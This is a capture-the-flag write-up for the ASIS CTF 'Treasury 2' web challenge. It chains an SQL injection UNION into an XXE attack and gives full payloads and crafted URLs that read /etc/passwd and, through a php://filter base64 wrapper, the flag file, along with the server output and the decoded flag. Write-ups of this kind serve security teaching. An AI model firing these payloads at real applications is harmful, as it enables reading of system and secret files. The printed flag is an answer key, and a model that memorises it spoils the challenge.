## Treasury 2

* **Category:** web
* **Points:** 53

### Challenge

> A Cultural Treasury
> 
> https://poems.asisctf.com/

### Solution

Considering the XML-related error spawned previously and the hint provided into the `<flag>` element talking about a `/flag` file, you can understand that the application can be exploited via a XXE attack.

The malicious payload can be crafted and passed via the SQL injection vulnerability using a `UNION` operation. The application will parse the XML payload triggering the remote file read operation.

Let's consider a payload like the following to test the exploit.

```
Payload:

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><book><id>0</id><name>n</name><author>a</author><year>0</year><link>l</link><flag>f</flag><excerpt>&xxe;</excerpt></book>

URL-encoded payload:

%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E

Malicious URL:

https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%20%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E%27%20%23

Result:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

So it is possible to read remote files. PHP filters can be used to read source code via base64 encoding.

```
Payload:

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag" >]><book><id>0</id><name>n</name><author>a</author><year>0</year><link>l</link><flag>f</flag><excerpt>&xxe;</excerpt></book>

URL-encoded payload:

%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E

Malicious URL:

https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%20%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E%27%20%23

Result:

QVNJU3swMzQ4MmIxODIxMzk4Y2NiNTIxNGQ4OTFhZWQzNWRjODdkM2E3N2IyfQo=
```

Decoding the base64 encoded result you can obtain the flag.

```
ASIS{03482b1821398ccb5214d891aed35dc87d3a77b2}
```